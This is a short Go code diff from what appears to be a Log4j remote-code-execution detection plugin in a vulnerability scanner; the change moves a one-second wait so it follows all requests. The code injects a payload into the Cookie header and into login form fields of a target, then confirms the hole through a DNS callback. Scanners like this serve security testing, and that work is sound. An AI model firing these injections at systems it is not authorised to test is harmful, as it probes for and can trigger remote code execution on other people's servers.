@@ -59,8 +59,6 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	request.Header.Set("Cookie", mainPayload)
 	_, _ = util.RequestDo(request, true)
 
-	time.Sleep(time.Duration(1) * time.Second)
-
 	postData := fmt.Sprintf("payload=%s&username=%s&password=%s&character_encoding=UTF-8", mainPayload, mainPayload, mainPayload)
 	request, _ = http.NewRequest("POST", URL, strings.NewReader(postData))
 	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
@@ -70,6 +68,8 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	request, _ = http.NewRequest("POST", URL+"/login", strings.NewReader(postData))
 	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	_, _ = util.RequestDo(request, true)
+
+	time.Sleep(time.Duration(1) * time.Second)
 
 	if utils.IsExistDNSLog(randStr) {
 		//result := d.info
